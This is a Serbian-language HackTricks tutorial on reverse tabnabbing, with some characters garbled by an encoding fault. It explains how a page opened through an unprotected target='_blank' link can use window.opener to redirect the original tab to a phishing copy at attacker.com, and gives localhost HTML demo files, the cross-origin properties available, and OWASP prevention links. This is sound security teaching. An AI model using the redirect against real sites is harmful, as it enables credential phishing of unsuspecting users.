<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju oglaÅ¡enu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>


# Opis

U situaciji kada **napadaÄ** moÅ¾e **kontrolisati** argument **`href`** **`<a`** taga sa atributom **`target="_blank" rel="opener"`** koji Ä‡e biti kliknut od strane Å¾rtve, **napadaÄ** moÅ¾e da **usmeri** ovaj **link** na veb stranicu pod njegovom kontrolom (zlonamerna veb stranica). Zatim, kada **Å¾rtva klikne** na link i pristupi napadaÄevom veb sajtu, ovaj **zlonamerni** **veb sajt** Ä‡e biti u moguÄ‡nosti da **kontroliÅ¡e** **originalnu** **stranicu** putem JavaScript objekta **`window.opener`**.\
Ako stranica nema **`rel="opener"` ali sadrÅ¾i `target="_blank"` i nema `rel="noopener"`** takoÄ‘e moÅ¾e biti ranjiva.

UobiÄajeni naÄin zloupotrebe ovog ponaÅ¡anja bio bi da **promeni lokaciju originalnog veba** putem `window.opener.location = https://attacker.com/victim.html` na veb koji kontroliÅ¡e napadaÄ, a koji **izgleda kao originalni**, tako da moÅ¾e **imitirati** **formu za prijavu** originalnog veb sajta i traÅ¾iti od korisnika pristupne podatke.

MeÄ‘utim, treba napomenuti da poÅ¡to **napadaÄ sada moÅ¾e da kontroliÅ¡e prozor originalnog veb sajta** on moÅ¾e da ga zloupotrebi na druge naÄine kako bi izveo **skrivenije napade** (moÅ¾da modifikovanjem JavaScript dogaÄ‘aja da bi izvrÅ¡io izvlaÄenje informacija na server koji kontroliÅ¡e on?).

# Pregled

## Sa povratnim linkom

Veza izmeÄ‘u roditeljske i deÄje stranice kada se ne koristi atribut za prevenciju:

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITH_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITH\_LINK.png)

## Bez povratnog linka

Veza izmeÄ‘u roditeljske i deÄje stranice kada se koristi atribut za prevenciju:

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITHOUT_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITHOUT\_LINK.png)

## Primeri <a href="#examples" id="examples"></a>

Kreirajte sledeÄ‡e stranice u folderu i pokrenite veb server sa `python3 -m http.server`\
Zatim, **pristupite** `http://127.0.0.1:8000/`vulnerable.html, **kliknite** na link i primetite kako se **URL originalnog veb sajta menja**.

{% code title="vulnerable.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>Victim Site</h1>
<a href="http://127.0.0.1:8000/malicious.html" target="_blank" rel="opener">Controlled by the attacker</a>
</body>
</html>
```
{% code title="malicious.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<script>
window.opener.location = "http://127.0.0.1:8000/malicious_redir.html";
</script>
</body>
</html>
```
{% code title="malicious_redir.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>New Malicious Site</h1>
</body>
</html>
```
{% endcode %}

## PristupaÄna svojstva <a href="#pristupaÄna-svojstva" id="pristupaÄna-svojstva"></a>

U scenariju kada se dogodi **prekograniÄni** pristup (pristup preko razliÄitih domena), svojstva instance JavaScript klase **window**, na koju se referiÅ¡e JavaScript objektna referenca **opener**, koja moÅ¾e biti pristupljena od strane zlonamerne stranice, su ograniÄena na sledeÄ‡e:

- **`opener.closed`**: Ovo svojstvo se koristi da bi se utvrdilo da li je prozor zatvoren, vraÄ‡ajuÄ‡i boolean vrednost.
- **`opener.frames`**: Ovo svojstvo omoguÄ‡ava pristup svim iframe elementima unutar trenutnog prozora.
- **`opener.length`**: Ovo svojstvo vraÄ‡a broj iframe elemenata prisutnih u trenutnom prozoru.
- **`opener.opener`**: Referenca na prozor koji je otvorio trenutni prozor moÅ¾e se dobiti putem ovog svojstva.
- **`opener.parent`**: Ovo svojstvo vraÄ‡a roditeljski prozor trenutnog prozora.
- **`opener.self`**: Ovo svojstvo omoguÄ‡ava pristup samom trenutnom prozoru.
- **`opener.top`**: Ovo svojstvo vraÄ‡a najviÅ¡i prozor pregledaÄa.

MeÄ‘utim, u sluÄajevima kada su domeni identiÄni, zlonamerna stranica dobija pristup svim svojstvima izloÅ¾enim od strane [**window**](https://developer.mozilla.org/en-US/docs/Web/API/Window) JavaScript objektne reference.

# Prevencija

Informacije o prevenciji su dokumentovane u [HTML5 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5\_Security\_Cheat\_Sheet.html#tabnabbing).

## Reference

* [https://owasp.org/www-community/attacks/Reverse_Tabnabbing](https://owasp.org/www-community/attacks/Reverse_Tabnabbing)




<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju oglaÅ¡enu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
